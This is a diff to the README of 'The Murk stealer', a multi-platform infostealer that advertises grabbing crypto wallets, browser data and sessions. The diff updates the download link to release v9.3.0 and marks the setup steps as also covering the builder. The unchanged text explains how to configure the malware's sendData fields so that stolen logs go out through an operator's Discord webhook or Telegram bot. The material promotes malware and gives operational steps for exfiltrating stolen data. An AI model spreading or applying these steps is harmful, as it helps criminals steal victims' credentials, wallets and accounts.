@@ -9,7 +9,7 @@
 
 
 **🔐Powerful multi-platform stealer with a huge pack of grabbed data. Wallets stealer, browsers stealer, sessions stealer, etc. All logs will be sent using discord webhooks or telegram bot.**
-[Download the latest release(outdated, only manual build support)](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v9.2.7)
+[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v9.3.0)
 
 ⭐Please, star this repo if it was helpful⭐
 
@@ -187,11 +187,11 @@ Foremost, download the source code. Then go to `The Murk\preferences` dir and op
 
 Now let's figure out how to fill out the fields of `sendData`.
 
-**For Discord**
+**For Discord(same for builder)**
 
 So firstly, create your Discord server and webhook there. [How to do it](https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks#conclusion). Then, insert the webhook link in a separate field as in example `[0, "url of your WebHook", "null"]`.
 
-**For Telegram**
+**For Telegram(same for builder)**
 
 So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your own bot, copy HTTP API of bot. Now you need to get your chat id. To do this, go to the next bot [@ShowJsonBot](https://t.me/ShowJsonBot) and copy the id too. Then, insert the HTTP API and the id in separate fields as in example `[1, "HTTP API", "chat ID"]`, don't forget to change the first var from 0 to 1.
 
